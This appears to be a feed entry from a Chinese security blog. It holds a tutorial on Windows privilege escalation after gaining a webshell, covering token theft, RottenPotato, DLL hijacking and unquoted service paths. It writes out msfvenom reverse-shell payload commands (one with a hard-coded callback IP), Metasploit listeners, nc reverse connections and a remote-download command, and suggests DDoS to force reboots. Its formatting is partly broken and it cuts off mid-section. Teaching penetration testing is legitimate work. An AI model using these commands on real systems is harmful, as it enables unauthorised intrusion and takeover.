    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="整体流程" scheme="https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>权限提升</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2023-06-14T02:42:23.000Z</published>
    <updated>2023-06-25T02:42:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system/root权限。这里主要是思路的体现。</p><h2 id="相关注意点"><a class="markdownIt-Anchor" href="#相关注意点"></a> 相关注意点</h2><ol><li>前期-中期-后期对应知识关系</li><li>知识点顺序，理解思路，分类介绍等</li><li>注重理解当前权限对应可操作的事情</li><li>相关的操作被拒绝无法实现的时候就会涉及到权限提升</li></ol><h2 id="权限分类"><a class="markdownIt-Anchor" href="#权限分类"></a> 权限分类</h2><p><strong>后台权限</strong></p><ol><li>获得方式：<strong>爆破，注入猜解，弱口令</strong>等获取的帐号密码配合登录</li><li>一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据）</li></ol><p><strong>网站权限</strong></p><ol><li>获得方式：<strong>爆破，注入猜解，弱口令</strong>等获取的帐号密码配合登录</li><li>查看或修改程序源代码，可以进行网站或应用的配置文件读取（<strong>接口配置信息，数据库配置信息等</strong>），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</li></ol><p><strong>数据库权限</strong></p><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。</p><p><strong>接口权限</strong></p><p>邮件，短信，支付，第三方登录等，一旦截获，我们就可以利用这个接口对他人进行攻击。</p><p><strong>系统权限</strong></p><p><strong>域控权限</strong></p><blockquote><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p></blockquote><h1 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> Webshell</h1><h2 id="获得权限的思路"><a class="markdownIt-Anchor" href="#获得权限的思路"></a> 获得权限的思路</h2><ol><li>寻找网站特征，判断cms，查找历史漏洞</li><li>若判断不了，搜集信息，搜集配置文件与源码，审计功能点</li><li>查找功能点，看有没有getshell的可能<ol><li>上传</li><li>sql注入</li><li>RCE等等</li></ol></li></ol><h2 id="某挂壁程序后台权限提升-后台功能"><a class="markdownIt-Anchor" href="#某挂壁程序后台权限提升-后台功能"></a> 某挂壁程序后台权限提升-后台功能</h2><ul><li><strong>前提：已经获取了后台账号密码</strong>（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录 ）</li></ul><p>后台权限和网站权限不同，后台权限不能对网站代码的层次进行修改</p><p>分析网站的CMS，</p><ul><li><p><strong>已知cms</strong></p><ol><li>在网上搜索CMS对应的漏洞，尝试复现。</li><li>网上未能找到相应版本漏洞，下载网站源码，进行代码审计，进行分析，寻找可以提权的漏洞</li><li>用功能点配合网站源码进行测试，在上传点抓包找到对应的代码</li></ol></li><li><p><strong>未知cms</strong></p><p>没有代码：直接常规测试，测试围绕文件上传、模板修改、SQL执行、数据备份等功能</p></li></ul><h2 id="某-bc-广告导航页权限提升-漏洞层面"><a class="markdownIt-Anchor" href="#某-bc-广告导航页权限提升-漏洞层面"></a> 某 BC 广告导航页权限提升-漏洞层面</h2><p>信息收集，发现中间件有漏洞</p><p>抓包了解网站使用的Apache和OpenSSL版本，凭借经验发现是基于PHPstudy的网站。根据网络资料<strong>复现PHPstudy的后门漏洞</strong>，实现命令执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache 2.4.** Mysql 5.*** PHP 5.***</span><br></pre></td></tr></table></figure><h2 id="glassfish-中间件-第三方"><a class="markdownIt-Anchor" href="#glassfish-中间件-第三方"></a> GlassFish 中间件-第三方</h2><p>通过FOFA信息收集，搜索使用GlassFish的网站作为目标根据网络资料复现GlassFish的任意文件读取漏洞（注意使用条件是否匹配）获取敏感信息，进行下一步渗透</p><h1 id="其他权限"><a class="markdownIt-Anchor" href="#其他权限"></a> 其他权限</h1><h1 id="服务器权限"><a class="markdownIt-Anchor" href="#服务器权限"></a> 服务器权限</h1><h2 id="win提权"><a class="markdownIt-Anchor" href="#win提权"></a> WIN提权</h2><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><h4 id="权限划分"><a class="markdownIt-Anchor" href="#权限划分"></a> 权限划分</h4><p><strong>普通权限</strong></p><p>一般系统分为七个组，每个组有对应不同的操作权限。<strong>管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、身份验证用户组(Ahthenticated users)、来宾用户组(Guests)</strong>、<em>文件复制组(Replicator)、备份操作组(Backup Operators)</em></p><ul><li>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）</li><li>来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。</li><li>身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。</li></ul><p><strong>特殊权限</strong></p><p>出了上述，还有系统的特殊成员：<strong>SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者)</strong> 。这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。</p><ul><li>真正拥有“完全访问权”的只有一个成员:SYSTEM</li></ul><h4 id="基础命令"><a class="markdownIt-Anchor" href="#基础命令"></a> 基础命令</h4><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>systeminfo</code></td><td>打印系统信息</td></tr><tr><td><code>whoami</code></td><td>获得当前用户名</td></tr><tr><td><code>whoami /priv</code></td><td>当前账户权限</td></tr><tr><td><code>ipconfig</code></td><td>网络配置信息</td></tr><tr><td><code>ipconfig /displaydns</code></td><td>显示DNS缓存</td></tr><tr><td><code>route print</code></td><td>打印出路由表</td></tr><tr><td><code>arp -a</code></td><td>打印arp表</td></tr><tr><td><code>hostname</code></td><td>主机名</td></tr><tr><td><code>net user</code></td><td>列出用户</td></tr><tr><td><code>net user &lt;UserName&gt;</code></td><td>关于用户的信息</td></tr><tr><td><code>net use \SMBPATHPa$$w0rd/u:UserName</code></td><td>连接SMB</td></tr><tr><td><code>net localgroup</code></td><td>列出所有组</td></tr><tr><td><code>net localgroup GROUP</code></td><td>关于指定组的信息</td></tr><tr><td><code>net view\127.0.0.1</code></td><td>会话打开到当前计算机</td></tr><tr><td><code>net session</code></td><td>开放给其他机器</td></tr><tr><td><code>netsh firewall show config</code></td><td>显示防火墙配置</td></tr><tr><td><code>DRIVERQUERY</code></td><td>列出安装的驱动</td></tr><tr><td><code>Tasklist /svc</code></td><td>列出服务任务</td></tr><tr><td><code>net start</code></td><td>列出启动的服务</td></tr><tr><td><code>dir/s foo</code></td><td>在目录中搜索指定字符的项</td></tr><tr><td><code>dir/s too==bar</code></td><td>同上</td></tr><tr><td><code>sc query</code></td><td>列出所有服务</td></tr><tr><td><code>sc qc ServiceName</code></td><td>找到指定服务的路径</td></tr><tr><td><code>shutdown /r/t 0</code></td><td>立即重启</td></tr><tr><td><code>type file.txt</code></td><td>打印出内容</td></tr><tr><td><code>Icacls “C:\Example”</code></td><td>列出权限</td></tr><tr><td><code>wmic qfe getCaption, Description,HotFixID,InstalledOn</code></td><td>列出已安装的补丁</td></tr><tr><td><code>(NewObject System.Net.WebClient).DownloadFile( “https://host/file&quot;/&quot;C:\LocalPath&quot;)</code></td><td>利用ps远程下载文件到本地</td></tr><tr><td><code>accesschk. exe-qwsu&quot;Group&quot;</code></td><td>修改对象(尝试Everyone，Authenticated Users和/或users)</td></tr></tbody></table><h3 id="web-shell提权思路"><a class="markdownIt-Anchor" href="#web-shell提权思路"></a> WEB-shell提权思路</h3><ol><li><p>前提是获得web权限</p></li><li><p>判断是什么系统，是服务器（2012 2003等等）还是个人主机（xp win7/10），判断当前权限</p><p>一般使用<code>systeminfo</code>（打了啥补丁）、<code>whoami /priv</code>（能做啥操作）</p></li><li><p>判断是否存在补丁，验证未打的补丁是否有的是<strong>权限提升</strong>/bypass的。</p><p>使用脚本：<a href="https://github.com/zhzyker/vulmap">Vulmap</a>、<a href="https://github.com/bitsadmin/wesng">Wes</a>、<a href="https://github.com/chroblert/WindowsVulnScan">WindowsVulnScan</a>使用KBCollect.ps1</p><p>Wes和WindowsVulnScan是python脚本（自己的环境有就行）</p></li><li><p>辅助工具：</p><ul><li><a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></li></ul></li></ol><p>发现exp后，使用msf反弹shell连接即可。以上是web上的提权方法。如果看到的补丁是主机层面的提权，则需要以下思路。</p><p>至于为什么会有两种方法？例如本地提权，如果使用的是新建窗口进行提权的，那么在web并不适用，因为没办法连接到新的cmd。</p><h3 id="本地提权思路溢出漏洞atscps"><a class="markdownIt-Anchor" href="#本地提权思路溢出漏洞atscps"></a> 本地提权思路——溢出漏洞/AT/SC/PS</h3><p>溢出漏洞的使用，msf已经足够了解了。有些漏洞可能只适应于本地环境提权，不适用于web环境提权。有些提权方法借助系统上的设计，逻辑上的问题来实现，并不总是依靠漏洞。</p><p>前提已经获得计算机的普通用户权限，较老的计算机系统，视频以Win2003为例，参考：<a href="https://blog.csdn.net/weixin_40412037/article/details/121535553">windows权限提升——AT、SC、PS命令提权</a></p><h4 id="at"><a class="markdownIt-Anchor" href="#at"></a> AT</h4><p><strong>适用范围：只针对Win7及之前的系统，从Win8开始不再支持at命令。</strong></p><p>打开cmd添加一项计划任务，在15:13打开一个cmd窗口，发现打开的窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 15:13 /interactive cmd.exe</span><br></pre></td></tr></table></figure><p>这是一个设计上的逻辑错误。<a href="https://blog.csdn.net/weixin_45677145/article/details/122061271?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_default&amp;utm_relevant_index=2">Windows中使用命令创建计划任务（at、schtasks）</a></p><h4 id="sc"><a class="markdownIt-Anchor" href="#sc"></a> SC</h4><p><strong>适用范围：03/08、12/16</strong></p><p>创建一个名叫“syscmd”的服务，运行它，发现得到的cmd窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure><h4 id="ps"><a class="markdownIt-Anchor" href="#ps"></a> PS</h4><p><strong>适用范围：适用于Win2003 &amp; Win2008</strong></p><p>下载微软官方的<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools</a>工具包，在下载的文件夹下执行下面的命令，发现得到的cmd窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d cmd.exe</span><br></pre></td></tr></table></figure><h3 id="令牌窃取及权限提升老"><a class="markdownIt-Anchor" href="#令牌窃取及权限提升老"></a> 令牌窃取及权限提升「老」</h3><p>主要发生在：windows2008 win7左右的系统，才能使用，现在应该就很少了。因为普通用户没办法通过令牌枚举来发现system或者administrator的令牌。所以没办法进行窃取。要发现这些令牌，可以使用烂土豆进行令牌模拟，这样就可以使用令牌窃取了。</p><p>一般都使用MSF进行令牌窃取，流程：</p><ol><li><p>在本地msf服务器上，执行以下命令，生成反弹shell木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=??? -f exe -o /root/xx.exe</span><br></pre></td></tr></table></figure></li><li><p>在本地msf服务器上执行以下命令，监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6677</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>将该木马xx.exe，上传到远程目标服务器，并运行木马程序。</p></li><li><p>本地监听到会话，查看权限为普通用户xiaodi</p></li><li><p>提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621163747422.png" alt="image-20230621163747422" /></p></li></ol><h3 id="进程注入dll劫持老"><a class="markdownIt-Anchor" href="#进程注入dll劫持老"></a> 进程注入（DLL劫持）「老」</h3><p>Windows2003&amp;10 进程注入提升 进程注入提权是本地提权方式的一种较为老的安全技术了，<strong>利用的是注入进程的所有者实现权限共享机制</strong>，这类技术主要利用在 windows2008 之前操作系统上，所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统，因为是系统特性，所以不会被杀软拦截。</p><p><strong>pinjector 进程注入工具针对-win2008 以前操作系统</strong></p><ol><li><p>上传到目标机器</p></li><li><p>运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pinjector.exe 　　　　　　//运行命令，查看用法</span><br><span class="line">pinjector.exe -l  //列出可注入的进程</span><br><span class="line">pinjector.exe -p 416 cmd.exe 6688 // pinjector.exe -p pid cmd.exe 6688　注入到系统正常的服务里，监听6688端口（后面是否为system权限）</span><br><span class="line">nc 192.168.131.111 6688 // 监听6688端口，成功反弹shell，成功提权</span><br></pre></td></tr></table></figure></li></ol><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101836817.png" alt="image-20230625101836817" style="zoom: 50%;" /><p>绑定：通过使用命令将权限绑定至system权限的进程中，这里选在进程最好绑定系统进程，这样能够实现开机自启。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101908888.png" alt="image-20230625101908888" style="zoom:50%;" /><blockquote><p>其原理是：查看这个软件运行了什么dll，我们就替换这个dll，当程序启动的时候，就会自动调用这个dll达到提权（如果这个软件的运行权限是system）</p></blockquote><h3 id="烂土豆ms16-075配合令牌窃取提权"><a class="markdownIt-Anchor" href="#烂土豆ms16-075配合令牌窃取提权"></a> 烂土豆MS16-075配合令牌窃取提权</h3><p>单纯令牌窃取：适用于web权限或本地提权，如配合烂土豆提权：适用于web或数据库等权限，因为这些权限才有模拟令牌的权限。</p><p>如果可以模拟令牌就可以枚举诸如system的令牌，就可以使用令牌窃取达成权限提升。</p><h4 id="rottenpotato原理"><a class="markdownIt-Anchor" href="#rottenpotato原理"></a> RottenPotato原理</h4><p>RottenPotato（烂土豆）提权的<strong>原理</strong>可以简述如下：</p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li><li>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。即<strong>非服务类用户权限无法窃取成功。</strong></p><p>具体权限（<code>whoami /priv</code>）/要求为：</p><ol><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限（用来模拟令牌）</li><li>注意RPC端口</li><li><a href="http://xn--49sq66hcqa154b.NET">需要安装.NET</a> Framework</li></ol><p>烂土豆比热土豆的优点是：</p><ol><li>100%可靠</li><li>（当时）全版本通杀。</li><li>立即生效，不用像hot potato那样有时候需要等<strong>Windows更新</strong>才能使用。</li></ol><p>总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p><p>烂土豆下载资源</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">windows-kernel-exploits/MS16-075 at master · SecWiki/windows-kernel-exploits (github.com)</a></p><p><a href="https://github.com/foxglovesec/RottenPotato">foxglovesec/RottenPotato: RottenPotato local privilege escalation from service account to SYSTEM (github.com)</a></p><h4 id="烂土豆提权流程"><a class="markdownIt-Anchor" href="#烂土豆提权流程"></a> 烂土豆提权流程</h4><p><strong>上传烂土豆----------&gt;执行烂土豆----------&gt;利用窃取模块----------&gt;窃取SYSTEM----------&gt;成功</strong></p><ol><li><p><a href="https://www.cnblogs.com/tianlinlin/p/10171981.html">上传后门</a>，生成一个后门，并上传到目标服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></li><li><p>启动监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5577</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>受害机执行后门</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621171531434.png" alt="image-20230621171531434" /></p><p>确定当前为webshell权限。<code>getuid</code></p></li><li><p>单纯令牌窃取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><p>提权失败，单纯用令牌窃取提权需要有一定的权限，这里的权限太低。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094704731.png" alt="image-20230625094704731" style="zoom:50%;" /></li><li><p>借助烂土豆提权</p><ol><li><p>上传potato.exe</p></li><li><p>在刚才的test的基础之上，再执行potato.exe</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094741213.png" alt="image-20230625094741213" style="zoom:80%;" /></li><li><pre class="hljs"><code class="">cd C:\\execute -cH -f ./potato.exeuse incognitolist_tokens -uimpersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"></span><br><span class="line">#### 注意的点</span><br><span class="line"></span><br><span class="line">1. 单纯令牌窃取是在一定的权限下才能实施成功的，需要有枚举system令牌的权限。</span><br><span class="line">2. 如果是普通权限，则使用烂土豆可以将令牌进行模拟，再使用令牌窃取完成攻击</span><br><span class="line"></span><br><span class="line">### DLL劫持提权应用配合MSF——web权限</span><br><span class="line"></span><br><span class="line">Windows程序启动的时候需要DLL库进行支持。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</span><br><span class="line"></span><br><span class="line">- 1、应用程序加载的目录</span><br><span class="line">- 2、C:\Windows\System32</span><br><span class="line">- 3、C:\Windows\System</span><br><span class="line">- 4、C:\Windows</span><br><span class="line">- 5、当前工作目录 Current Working Directory，CWD</span><br><span class="line">- 6、在 PATH 环境变量的目录（先系统后用户）</span><br><span class="line"></span><br><span class="line">CS中的使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升，但是缺陷比较明显，只能使用默认的CLSID(&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)进行提权,如果想使用其他CLSID请参考命令行等执行方法</span><br><span class="line"></span><br><span class="line">#### DLL劫持提权流程</span><br><span class="line"></span><br><span class="line">**信息收集----------&gt;进程调试----------&gt;制作 dll 并上传----------&gt;替换 dll----------&gt;启动应用后成功**</span><br><span class="line"></span><br><span class="line">- 信息收集：服务器上有的第三方软件</span><br><span class="line"></span><br><span class="line">  一般看有什么程序的文件夹</span><br><span class="line"></span><br><span class="line">- 进程调试：程序运行的事=时候调用了那些dll（火绒剑可以看）</span><br><span class="line"></span><br><span class="line">  一般一些写在system的dll是改不了的，所以看存在程序同名目录下的dll文件。</span><br><span class="line"></span><br><span class="line">  &lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625095218724.png&quot; alt=&quot;image-20230625095218724&quot; style=&quot;zoom:80%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">* 找到该dll，用msf生成木马进行替换：</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ol></li></ol><p>msfvenom -p windows/meterpreter/reverse_tcp<br />lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/xiaodi.dll</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* MSF启动监听，然后配合令牌窃取成功提权</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>msfconsole<br />use exploit/multi/handler<br />set payload  windows/meterpreter/reverse_tcp<br />set lhost 0.0.0.0<br />set lport 6677<br />exploit</p><p>use incognito<br />list_tokens -u<br />impersonate_token “NT AUTHORITY\SYSTEM”</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 注意</span><br><span class="line"></span><br><span class="line">- dll劫持提权需要**特定软件应用的控制权限及启用配合**，复杂鸡肋</span><br><span class="line">- AlwaysInstallElevated提权默认禁用配置，利用成功机会很少</span><br><span class="line"></span><br><span class="line">### 不带引号服务路径配合MSF</span><br><span class="line"></span><br><span class="line">当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完 整路径，则系统会按字面解释它并执行，像这样。</span><br><span class="line"></span><br><span class="line">带引号：</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100010606.png&quot; alt=&quot;image-20230625100010606&quot; style=&quot;zoom:67%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">不带引号：</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100053640.png&quot; alt=&quot;image-20230625100053640&quot; style=&quot;zoom:67%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">不带引号而且不安全的：</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100611727.png&quot; alt=&quot;image-20230625100611727&quot; style=&quot;zoom: 67%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">一旦我们使用了不带引号的方式执行命令，且命令中路径包含空格，将会出现这种情况：</span><br><span class="line"></span><br><span class="line">首先是正常的（我直接拖进来的程序）：</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100313042.png&quot; alt=&quot;image-20230625100313042&quot; style=&quot;zoom:50%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">不正常的：</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100425455.png&quot; alt=&quot;image-20230625100425455&quot; style=&quot;zoom:67%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">因为有空格，那么后面的字符串就被认为是参数，传入到Program这个“程序”中，然而，没有这个程序。如果我们自己伪造一个Program程序，那么即可执行！</span><br><span class="line"></span><br><span class="line">#### 流程</span><br><span class="line"></span><br><span class="line">1. 使用msf制作一个后门，命名为Program.exe，上传到目标服务器C盘根目录</span><br><span class="line"></span><br><span class="line">2. 启动服务/重启。</span><br><span class="line"></span><br><span class="line">   启动服务。可以在webshell中或者本地启动服务。但是测试时，webshell中启动不了，所以不带引号服务路径提权方法还是多用于本地提权。</span><br><span class="line"></span><br><span class="line">   重启啥的，可以使用ddos攻击</span><br><span class="line"></span><br><span class="line">### 不安全服务权限配合MSF——本地权限</span><br><span class="line"></span><br><span class="line">即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限。例如，可以直接修改它导致重定向执行文件。这样我们可以达到这样的效果：</span><br><span class="line"></span><br><span class="line">1. **修改服务项中的运行地址，将之从安全的，带引号的服务路径，变成不带引号的。**</span><br><span class="line">2. **改成我们自己的木马地址**</span><br><span class="line"></span><br><span class="line">#### 流程</span><br><span class="line"></span><br><span class="line">**检测服务权限配置----------&gt;制作文件并上传----------&gt;更改服务路径指向----------&gt;调用后成功**</span><br><span class="line"></span><br><span class="line">1. 检测服务权限配置</span><br><span class="line"></span><br><span class="line">   使用[accessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)这个命令，他是官方的，所以不会被杀掉。执行命令，检测当前用户所在组的服务权限（实战中一般都不是administrators组，这里仅做测试用），列出的都是当前用户可以操作的服务</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>accesschk.exe -uwcqv “administrators” *</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 